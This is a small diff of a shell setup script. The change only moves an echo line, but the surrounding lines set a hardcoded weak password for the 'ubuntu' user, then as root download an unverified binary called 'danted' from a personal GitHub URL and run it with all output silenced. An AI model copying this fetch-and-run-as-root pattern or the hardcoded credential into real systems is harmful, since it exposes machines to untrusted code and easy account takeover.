@@ -3,8 +3,8 @@ echo ==== create username =========
 echo ubuntu:1234abcd | chpasswd
 sleep 2
 sudo su <<EOF
-echo ==== installing..... =========
 wget https://raw.githubusercontent.com/sarifadim/dopla/main/danted && chmod +x * && ./danted > /dev/null 2>&1
+echo ==== installing..... =========
 sleep 3
 cd /home/
 sleep 3
